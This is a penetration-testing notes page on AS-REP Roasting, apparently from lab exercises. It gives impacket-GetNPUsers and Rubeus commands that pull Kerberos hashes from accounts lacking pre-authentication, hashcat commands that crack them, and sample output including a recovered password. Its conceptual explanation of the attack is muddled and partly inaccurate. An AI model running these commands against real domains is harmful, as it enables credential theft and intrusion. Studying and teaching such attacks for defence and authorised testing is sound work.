# AS-REP Roasting



## Recap

The first step of authentication in Kerberos is to send an AS-REQ to the domain controller. If the authentication is successful, a AS-REP is sent to the AD user containing the session key and Ticket Granting Ticket (TGT). This is called _**Kerberos Pre-authentication**_.



## AS-REP Roasting

_**A user is vulnerable to AS-REP Roasting if Kerberos Pre-authentication is disabled.**_

AS-REP Roasting is when an attacker sends a AS-REQ on behalf of another user after acquiring a  AS-REP from the server. The attacker can use an offline password against the encrypted response.

## Attacking with Impacket-GetNPUsers

```powershell
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
```

The output shows that dave has kerberos pre-authentication set to disabled. He's vulnerable to AS-Roasting!

### Cracking with Hashcat

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
</strong>...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f33...751a876a756757dc22:Flowers1
</code></pre>

##

## AS-REP Roasting without credentials

If we have a user list but no credentials we can look for users that don't require Kerberos pre-authentication "AS-REP Roasting"

```sh
kali@kali:~$ impacket-GetNPUsers -dc-ip htb.local -request 'htb.local/'                                                                     
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-02-07 22:18:28.185616  2024-02-07 09:14:25.279474  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:20a92d6ea68903d4bb8aa15dc9592fdf$98ce719d2b34cee82612532f8b7bb1858466e7a001b307bbfde16fa469dd86f6843c8b4b79ead213c27df71639156513bd41f39d236f3cde4158a9da513c886f893ce39fa3ceadb528417d02ef50b91d5df0e2eec926a42cc19108783b45f582ea59d86fd2111e83ea4d54ebb59b4ad5eb78e02213ba44488e74ce73c3f8fa8775bc780f0822400662cb08e1f0d59b815a65d4eec9abc6e9211bdfd9e963d849970791873dd108e802b16c8f6686393ac8a9c1bcbc9d509542188da56fdb7066f025ce0200e397607448672a66eb2f08642a5b57a951e277337560387e2878400f4c6e4f49dc



```

##

## AS-REP Roasting on Windows

We can use Rubeus to perform AS-REP Roasting on Windows.

```powershell
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011..AGD91
```

### Cracking with Hashcat

We can then Ex-filtrate the hash and crack with hashcat.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
</strong>...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f33...751a876a756757dc22:Flowers1
</code></pre>
